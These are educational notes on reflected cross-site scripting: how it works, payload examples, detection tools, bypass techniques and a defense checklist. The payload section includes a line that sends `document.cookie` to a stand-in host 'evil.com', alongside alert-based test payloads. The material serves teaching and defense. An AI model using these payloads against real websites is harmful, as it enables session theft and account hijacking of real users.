# 🚨 Reflected XSS (Cross-Site Scripting) — Complete Notes

## 🧠 What is Reflected XSS?

Reflected XSS is a type of vulnerability where **malicious JavaScript is reflected from the server into the user's browser** and executed immediately.

- ❌ Not stored on the server (non-persistent)  
- 💥 Triggered by clicking a malicious link  
- 📍 Common in search results, error pages, or form outputs

---

## 🧪 Example Attack

**URL:**

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**Rendered HTML:**

```html
<p>Search results for <script>alert('XSS')</script></p>
```

💥 Result: JavaScript is executed on page load.

---

## 🎯 How Attackers Exploit Reflected XSS

### Common Vectors

- URL parameters: `?q=`, `?search=`
- Form inputs
- HTTP headers like `Referer`, `User-Agent`

### Payload Examples

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
"><svg/onload=alert(1)>
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```

### Attacker Goals

- 🥷 Steal session cookies  
- 🎯 Log keystrokes  
- 🔀 Redirect users  
- 🧪 Inject fake forms (phishing)  
- 🕵️‍♂️ Perform actions as the user (session hijacking)

---

## 🔍 How to Detect Reflected XSS

### Manual Testing

Input a test payload:

```html
<script>alert(1)</script>
```

Check if it gets reflected and executed in the browser.

### Tools for Detection

- Burp Suite  
- OWASP ZAP  
- XSS Hunter  
- Dalfox  
- XSStrike  

### Helpful Browser Extensions

- XSS Radar  
- HackBar  

---

## 🔒 How to Prevent Reflected XSS

### ✅ Escape Output (Context-Aware)

- HTML: `&lt;`, `&gt;`, `&quot;`, `&#x27;`  
- JavaScript: properly escape strings  
- URL: use `encodeURIComponent()`

### ✅ Avoid Raw HTML Injection

Never use `innerHTML`, `document.write()`, or template literals with unescaped user input.

### ✅ Use a Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self';
```

### ✅ Sanitize Input

Use libraries like:

- DOMPurify (client-side)  
- OWASP Java Encoder (server-side)  
- Microsoft AntiXSS  

### ✅ Validate Input

- Whitelist acceptable characters  
- Reject or sanitize unexpected input  

### ✅ Use HTTPOnly Cookies

Prevent JavaScript access to session tokens.

---

## 🔧 How Frontend Frameworks Help (But Be Careful)

Modern frameworks like React, Angular, and Vue auto-escape by default.

- ✅ Safe: `{userInput}` in React  
- ⚠️ Dangerous: `dangerouslySetInnerHTML`, `v-html`, `innerHTML`  

Always sanitize external content before injecting into the DOM.

---

## 📊 XSS Types Comparison

| Type        | Persistent? | Triggered By         | Stored on Server? |
|-------------|-------------|----------------------|-------------------|
| Reflected   | No          | Clicking a link      | No                |
| Stored      | Yes         | Viewing the page     | Yes               |
| DOM-Based   | No          | JavaScript in browser| No                |

---

## 🧠 Advanced Bypasses and Obfuscation

Attackers may use:

- Encoded payloads: `%3Cscript%3E`  
- Event handlers: `onmouseover`, `onerror`, etc.  
- Alternative tags: `<svg>`, `<iframe>`, `<object>`  
- HTTP parameter pollution  
- Template injection in server-side rendering  

---

## ✅ Defense Checklist

- [x] Escape output based on context (HTML, JS, URL)  
- [x] Sanitize inputs with trusted libraries  
- [x] Use a strong Content Security Policy  
- [x] Apply HTTPOnly and Secure flags on cookies  
- [x] Avoid `eval()`, `innerHTML`, `document.write()`  
- [x] Don’t reflect user input unless absolutely necessary  
- [x] Test regularly with security tools  

---

## 💡 Quick Test Payload

```html
"><script>alert('XSS')</script>
```

Use this on forms, query parameters, and input fields to test for vulnerability.

---

## 🧰 Tools & Resources

### Testing Tools

- Burp Suite  
- OWASP ZAP  
- Dalfox  
- XSStrike  

### Sanitization Libraries

- DOMPurify  
- JS-XSS  
- Google Caja *(deprecated but informative)*

### CSP Evaluator

- https://csp-evaluator.withgoogle.com
